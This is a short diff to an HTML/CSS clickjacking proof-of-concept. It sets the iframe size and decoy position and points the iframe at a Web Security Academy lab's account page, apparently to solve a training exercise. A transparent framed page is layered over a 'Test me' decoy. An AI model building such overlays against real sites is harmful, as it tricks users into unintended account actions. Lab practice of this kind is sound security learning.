@@ -1,17 +1,17 @@
 <style>
    iframe {
        position:relative;
-       width:$width_value;
-       height: $height_value;
+       width:700px;
+       height: 500px;
        opacity: $opacity;
        z-index: 2;
    }
    div {
        position:absolute;
-       top:$top_value;
-       left:$side_value;
+       top:300px;
+       left:60px;
        z-index: 1;
    }
 </style>
 <div>Test me</div>
-<iframe src="$url"></iframe>
+<iframe src="https://ac151f371e74f16880fa8e9f00180003.web-security-academy.net/my-account"></iframe>
